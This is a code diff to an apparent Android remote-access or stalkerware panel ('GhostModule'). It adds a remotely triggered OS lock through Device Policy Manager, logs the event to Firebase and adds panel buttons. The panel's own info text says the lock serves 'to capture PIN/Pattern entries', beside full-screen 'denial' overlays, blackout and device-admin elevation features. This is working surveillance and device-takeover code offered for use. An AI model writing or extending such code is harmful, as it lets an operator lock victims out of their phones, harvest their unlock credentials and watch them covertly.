@@ -97,6 +97,34 @@ public class GhostModule extends BaseModule {
         return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
     }
 
+    private Response triggerOsLock() {
+        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
+        boolean locked = false;
+        if (ghost != null) {
+            locked = ghost.lockScreenNow();
+        }
+
+        if (!locked) {
+            try {
+                android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
+                android.content.ComponentName admin = new android.content.ComponentName(context, com.labs.labrats.StabilityPolicy.class);
+                if (dpm != null && dpm.isAdminActive(admin)) {
+                    dpm.lockNow();
+                    locked = true;
+                }
+            } catch (Exception e) {
+                android.util.Log.e("GhostModule", "Device Admin lockNow failed: " + e.getMessage());
+            }
+        }
+
+        if (locked) {
+            com.labs.labrats.FirebaseConfig.logActivity("KEYGUARD_LOCK: Standard OS phone lock triggered");
+            return newResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\":\"OS_LOCK_DISPATCHED\"}");
+        }
+
+        return newResponse(Response.Status.OK, "application/json", "{\"success\": false, \"error\":\"LOCK_SERVICE_UNAVAILABLE\"}");
+    }
+
     private Response deployOverlay(Map<String, String> params) {
         String type = params.get("type");
         IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
@@ -409,11 +437,13 @@ public class GhostModule extends BaseModule {
         html.append("<button id=\"blackout-btn\" onclick=\"toggleBlackout()\" class=\"btn btn-small\" style=\"width:100% !important; margin:15px 0 0 0;\">ACTIVATE</button>");
         html.append("</div>");
 
-        // 5. System Denial Lock
+        // 5. System Denial Lock & OS Keyguard Lock
         html.append("<div class=\"info-item\" style=\"background: rgba(255,49,49,0.03);\">");
-        html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.8rem;\">SYSTEM_DENIAL_LOCK <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_DENIAL_LOCK', 'Deploy a persistent, full-screen security overlay to lock physical interaction.')\">INFO</span></div>");
-        html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); width:100% !important; margin:15px 0 0 0;\">DEPLOY_LOCK</button>");
-        html.append("</div>");
+        html.append("<div class=\"info-label\" style=\"color: var(--danger); font-size: 0.8rem;\">SYSTEM_LOCKS <span class=\"info-trigger\" onclick=\"showInfo(event, 'SYSTEM_LOCKS', 'Trigger instant standard OS Keyguard phone lock to capture PIN/Pattern entries, or deploy our persistent full-screen security denial overlay.')\">INFO</span></div>");
+        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px;\">");
+        html.append("<button id=\"os-lock-btn\" onclick=\"triggerOsLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); width: 100% !important; margin: 0; font-size: 0.55rem; font-weight: bold;\" title=\"Trigger Standard OS Keyguard Lock\">OS_LOCK</button>");
+        html.append("<button id=\"lock-btn\" onclick=\"toggleLock()\" class=\"btn btn-small\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); width: 100% !important; margin: 0; font-size: 0.55rem; font-weight: bold;\" title=\"Toggle Full Screen Security Denial Overlay\">LOCKOUT</button>");
+        html.append("</div></div>");
 
         // 6. Device Admin Elevation Section
         html.append("<div class=\"info-item\" style=\"background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.4); border-radius: 12px; box-shadow: 0 0 15px rgba(168, 85, 247, 0.1);\">");
@@ -632,6 +662,10 @@ public class GhostModule extends BaseModule {
                 }
             });
             return newResponse(Response.Status.OK, "application/json", "{\"success\":true}");
+        }
+
+        if (action.equals("os_lock") || action.equals("oslock")) {
+            return triggerOsLock();
         }
 
         if (action.equals("elevateAdmin") || action.equals("elevate_admin") || action.equals("admin")) {
